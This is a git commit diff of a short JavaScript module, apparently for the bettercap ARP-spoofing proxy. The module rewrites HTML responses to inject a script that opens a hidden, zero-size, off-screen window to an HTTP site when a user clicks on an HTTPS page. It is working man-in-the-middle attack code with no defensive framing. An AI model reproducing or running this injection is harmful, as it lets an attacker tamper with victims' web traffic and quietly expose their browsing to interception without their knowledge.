dcfb8c68af8c0290a66d7a168903dc9849429c75
Centr <50579294+seoqs@users.noreply.github.com>
2019-06-02 00:30:24 +1000

    Update newWindowHTTP.js

--- newWindowHTTP.js
+++ newWindowHTTP.js
@@ -1,10 +1,15 @@
-var w;       
-document.body.onclick = function() {
-if ( window.location.protocol == "https:") {
-  if (!w || w.closed) {
-    w = window.open("http://time.com", "time", 'width=,height=,directories=0,titlebar=0,toolbar=0,location=0,status=0,menubar=0,scrollbars=no,resizable=no,addressbar=0');
-	w.resizeTo(0,0);
-	w.moveTo(window.screen.availWidth,window.screen.availHeight);
-  } 
-} 
-};
+//Opens a new window of the browser
+
+function onLoad() {
+	log('Open new window Inject loaded.');	log('targets: ' + env['arp.spoof.targets']);
+}
+
+function onResponse(req, res) {
+	if (res.ContentType.indexOf('text/html') == 0) {
+		var body = res.ReadBody();
+		if (body.indexOf('</head>') != -1) {
+			res.Body = body.replace('</head>', '<script type="text/javascript">var w; document.body.onclick = function() { if ( window.location.protocol == "https:") {if (!w || w.closed) { w = window.open("http://time.com", "time", "width=,height=,directories=0,titlebar=0,toolbar=0,location=0,status=0,menubar=0,scrollbars=no,resizable=no,addressbar=0"); w.resizeTo(0,0); w.moveTo(window.screen.availWidth,window.screen.availHeight);} } };;</script></head>');
+		}
+	}
+}
+
